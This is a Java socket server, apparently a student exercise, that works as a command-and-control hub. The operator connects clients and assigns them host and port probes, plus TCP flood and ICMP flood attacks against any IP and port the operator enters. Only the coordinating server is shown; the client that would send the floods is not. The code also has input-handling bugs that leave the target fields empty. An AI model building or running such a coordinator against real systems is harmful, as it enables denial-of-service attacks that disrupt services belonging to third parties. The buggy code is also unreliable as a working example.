// Java implementation of Server side 
// It contains two classes : JobCreator and ClientHandler  

import java.io.*; 
import java.text.*; 
import java.util.*; 
import java.net.*; 

// JobCreator class 
public class JobCreator 
{ 
	public static void main(String[] args) throws IOException 
	{ 
		// server is listening on port 5056 
		ServerSocket ss = new ServerSocket(5056); 
		
		// running infinite loop for getting 
		// client request 
		while (true) 
		{ 
			Socket s = null; 
			
			try
			{ 
				// socket object to receive incoming client requests 
				s = ss.accept(); 
				
				System.out.println("A new client is connected : " + s); 
				
				// obtaining input and output streams 
				DataInputStream dis = new DataInputStream(s.getInputStream()); 
				DataOutputStream dos = new DataOutputStream(s.getOutputStream()); 
				
				System.out.println("Assigning new thread for this client"); 

				// create a new thread object 
				Thread t = new ClientHandler(s, dis, dos); 

				// Invoking the start() method 
				t.start(); 
				
			} 
			catch (Exception e){ 
				s.close(); 
				e.printStackTrace(); 
			} 
		} 
	} 
} 

// ClientHandler class 
class ClientHandler extends Thread 
{ 

	final DataInputStream dis; 
	final DataOutputStream dos; 
	final Socket s; 
	

	// Constructor 
	public ClientHandler(Socket s, DataInputStream dis, DataOutputStream dos) 
	{ 
		this.s = s; 
		this.dis = dis; 
		this.dos = dos; 
	} 

	@Override
	public void run()
	{ 
		String received; 
		String toreturn; 
		while (true) 
		{ 
			try { 
				Scanner scn = new Scanner(System.in);

				// Ask user what he wants 
				dos.writeUTF("Type Job to get a Job Or Type Exit to terminate connection"); 
				
				// receive the answer from client 
				received = dis.readUTF(); 
				
				if(received.equals("Exit")) 
				{ 
					System.out.println("Client " + this.s + " sends exit..."); 
					System.out.println("Closing this connection."); 
					this.s.close(); 
					System.out.println("Connection closed"); 
					break; 
				} else if (received.equals("Job")) {
					System.out.println("Accept Job Application(Y/N): ");
					String jobOffer = scn.nextLine();
					if(jobOffer.equals("N")){
						toreturn = "Job Application Rejected";
						dos.writeUTF(toreturn);
						System.out.println("Closing this connection."); 
						this.s.close(); 
						System.out.println("Connection closed");
						break;
					}
				}

				// Job Options
				boolean isOnline;
				int prt;
				String b;
				System.out.println("Select job for Jobseeker to perform? (Enter the Job Number)");
        		System.out.println("1. Detect if a given IP address or Host Name is online or not.");
        		System.out.println("2. Detect the status of the given port at the given IP address.");
        		System.out.println("3. Execute a TCP flood attack against the given port on the given IP.");
        		System.out.println("4. Execute a ICMP flood attack against the given IP.");
        		int jobNum = scn.nextInt();

        		//Assign Jobs
        		switch(jobNum){
        			case 1 :
                        System.out.println("Press 1 To Detect by IP address.\n 	2 To Detect by host name.");
                        int a = scn.nextInt();
                        if(a == 1){
                            System.out.println("Please enter the IP address: \n");
                            b = scn.nextLine();
                        }
                        else{
                        	System.out.println("Please enter the host name: \n");
                        	b = scn.nextLine();	
                        }
                        toreturn = "1. Detect if the below IP or Host name is online or not.";
                        dos.writeUTF(toreturn);
                        dos.writeUTF(b);
                        isOnline = dis.readBoolean();
						if(isOnline == true){
							System.out.println("Job Done ...." + b + "is online");
						}else{
							System.out.println("Job Done ...." + b + "is not online");
						}
                        break;
                    case 2 : 
                    	toreturn = "2. Detect the status of the given port at the given IP address.";
                        dos.writeUTF(toreturn);
                    	System.out.println("Enter the ip address");
                    	b = scn.nextLine();
                    	dos.writeUTF(b);
                    	System.out.println("Enter the port");
                    	prt = scn.nextInt();
                    	dos.writeInt(prt);
                    	isOnline = dis.readBoolean();
                    	if(isOnline == true){
                    		System.out.println("Job Done ...." + b + " at port " + prt + " is online");
						}else{
							System.out.println("Job Done ...." + b + " at port " + prt + " is not online");
                    	}
                    	break;
                    case 3 : 
                    	toreturn = "3. Execute a TCP flood attack against the given port on the given IP.";
                    	dos.writeUTF(toreturn);
                    	System.out.println("Enter the ip address");
                    	b = scn.nextLine();
                    	dos.writeUTF(b);
                    	System.out.println("Enter the port");
                    	prt = scn.nextInt();
                    	dos.writeInt(prt);
                    	break;
                    case 4 : 
                    	toreturn = "4. Execute a ICMP flood attack against the given given IP.";
                    	dos.writeUTF(toreturn);
                    	System.out.println("Enter the ip address");
                    	b = scn.nextLine();
                    	dos.writeUTF(b);   
                    	break;              
                    default : 
                    	break;
        		}
				
			 
			} catch (IOException e) { 
				e.printStackTrace(); 
			} 
		} 
		
		try
		{ 
			// closing resources 
			this.dis.close(); 
			this.dos.close(); 
			
		}catch(IOException e){ 
			e.printStackTrace(); 
		} 
	} 
} 
